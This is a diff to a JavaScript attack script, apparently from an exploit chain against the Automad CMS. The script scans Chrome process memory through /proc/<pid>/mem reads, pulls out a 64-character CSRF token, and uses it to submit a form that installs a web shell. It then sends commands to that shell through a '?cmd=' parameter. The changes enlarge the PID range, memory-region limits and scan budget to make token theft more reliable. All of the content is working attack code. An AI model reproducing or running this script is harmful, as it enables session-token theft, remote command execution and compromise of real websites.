@@ -31,10 +31,18 @@ const install=csrf=>{
  f.submit();
  setTimeout(()=>{location.href=SHELL+'?cmd='+encodeURIComponent(cmd())},25000);
 };
+const tryChunk=d=>{
+ let low=d.toLowerCase();
+ if(!(low.includes('csrf')||low.includes('__csrf__')||low.includes('automad')||low.includes('dashboard')||low.includes('/_api')))return '';
+ let m=low.match(/[a-f0-9]{64}/g)||[];
+ return m.find(x=>!/^0+$/.test(x))||'';
+};
 post('stage start');
-for(let pid=1;pid<900;pid++){
+let pc=0;
+for(let pid=1;pid<5000;pid++){
  let c=await rt('/proc/'+pid+'/cmdline');
   if(!/chrome|chromium/i.test(c))continue;
+ pc++;
  post('pid '+pid);
  let mr=await r('/proc/'+pid+'/maps');
  post('maps '+mr[0]+' '+mr[1].length);
@@ -44,32 +52,30 @@ for(let pid=1;pid<900;pid++){
  for(let line of m.split('\n')){
   let q=line.split(/\s+/),x=q[0],perm=q[1]||'',name=q[5]||'';
   if(!x||!perm.includes('r')||!perm.includes('w'))continue;
-  if(name&&name!='[heap]'&&!name.includes('/dev/shm'))continue;
   let [s,e]=x.split('-').map(v=>parseInt(v,16));
   if(!s||!e||e<=s)continue;
   let sz=e-s;
-  if(sz>0x4000000)continue;
-  regs.push({s,e,sz,name});
+  if(sz>0x20000000)continue;
+  let pri=(name=='[heap]'?0:name.includes('/dev/shm')?1:name?3:2);
+  regs.push({s,e,sz,name,pri});
  }
- regs.sort((a,b)=>(a.name=='[heap]'?-1:0)-(b.name=='[heap]'?-1:0)||a.sz-b.sz);
+ regs.sort((a,b)=>a.pri-b.pri||a.sz-b.sz);
  post('regions '+regs.length);
  let scanned=0;
  for(let g of regs){
-  let step=g.sz>0x400000?0x8000:0x2000;
+  let step=Math.max(0x4000,Math.floor(g.sz/96));
   let [st,probe]=await r('/proc/'+pid+'/mem?offset=0x'+g.s.toString(16)+'&limit=64');
   if(st!=200)continue;
   for(let off=g.s;off<g.e;off+=step){
    scanned++;
    if(scanned%200==0)post('scan '+scanned);
-   if(scanned>900){post('scan limit');break}
-   let d=await rt('/proc/'+pid+'/mem?offset=0x'+off.toString(16)+'&limit=1500');
-   if(d.includes('csrf')||d.includes('csrfToken')||d.includes('Automad')){
-    let z=d.match(/[a-f0-9]{64}/);
-    if(z){install(z[0]);return}
-   }
+   if(scanned>1800){post('scan limit');break}
+   let d=await rt('/proc/'+pid+'/mem?offset=0x'+off.toString(16)+'&limit=4000');
+   let z=tryChunk(d);
+   if(z){install(z);return}
   }
-  if(scanned>900)break;
+  if(scanned>1800)break;
  }
 }
-post('csrf not found');
+post('csrf not found pids '+pc);
 })();
